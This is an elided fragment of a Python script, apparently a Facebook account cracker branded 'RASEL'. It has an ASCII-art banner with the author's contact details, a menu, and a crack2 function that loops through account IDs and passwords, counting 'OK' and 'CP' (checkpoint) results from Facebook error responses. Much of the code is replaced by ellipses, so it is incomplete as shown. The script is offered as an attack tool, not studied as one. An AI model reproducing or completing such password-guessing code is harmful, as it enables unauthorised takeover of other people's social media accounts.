...
888   Y88b                            888 
888    888                            888 
888   d88P  8888b.  .d8888b   .d88b.  888 
8888888P"      "88b 88K      d8P  Y8b 888 
888 T88b   .d888888 "Y8888b. 88888888 888 
888  T88b  888  888      X88 Y8b.     888 
888   T88b "Y888888  88888P'  "Y8888  888
       

                      
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mRASEL AHMED 
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+88013015******1530
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1mMR RASEL AHMED 
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
	Rasel = input(x+'\33[1;96m•Input Number> ')
	if Rasel in ['1','01']:
		File2()
	elif Rasel in ['0','00']:
		os.system
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [RASEL] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [RASEL-CP] %s|%s        '%(b,idf,pw))
